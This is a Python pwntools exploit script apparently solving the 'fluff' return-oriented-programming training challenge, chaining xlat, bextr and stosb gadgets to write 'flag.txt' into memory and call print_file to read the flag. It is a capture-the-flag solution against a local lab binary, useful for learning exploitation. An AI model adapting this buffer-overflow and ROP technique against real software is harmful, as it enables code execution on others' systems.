from pwn import *

elf = ELF("fluff")
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x98
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32

def targetify(needle):
    result = []
    for c in needle:
        found = False
        for s in elf.segments:
            if s.header.p_flags & 4: # PF_R
                i = s.data().find(c)
                if i != -1:
                    result.append(s.header.p_vaddr + i)
                    found = True
                    break
        if not found:
            raise Exception(f'{c} not found')
    return result

def main():
    memory = elf.bss(0x800)
    path = b'flag.txt'

    xlat_gadget = elf.symbols.questionableGadgets # xlat; ret -> al = byte ptr [rbx + al]
    bextr_gadget = elf.symbols.questionableGadgets + 2 # pop rdx; pop rcx; add rcx, 0x3EF2; bextr rbx, rcx, rdx; ret
    stosb_gadget = elf.symbols.questionableGadgets + 17 # stosb; ret -> [rdi] = al

    payload = flat \
    ({
        BUFFER_SIZE + context.bytes:
        [
            # load destination where to write the file path
            rop.rdi.address, memory,

            # use weird gadgets to put one path char at a time in memory
            [
                [
                    bextr_gadget, 0x4000, target - 0x3EF2 - (path[i - 1] if i != 0 else len(b'Thank you!\n')),
                    xlat_gadget,
                    stosb_gadget,
                ]
                for i, target in enumerate(targetify(path))
            ],

            # call target function with file name as arg
            rop.rdi.address, memory,
            elf.symbols.print_file,
        ]
    })
    assert len(payload) <= 0x200
    
    c = connection()
    c.sendlineafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
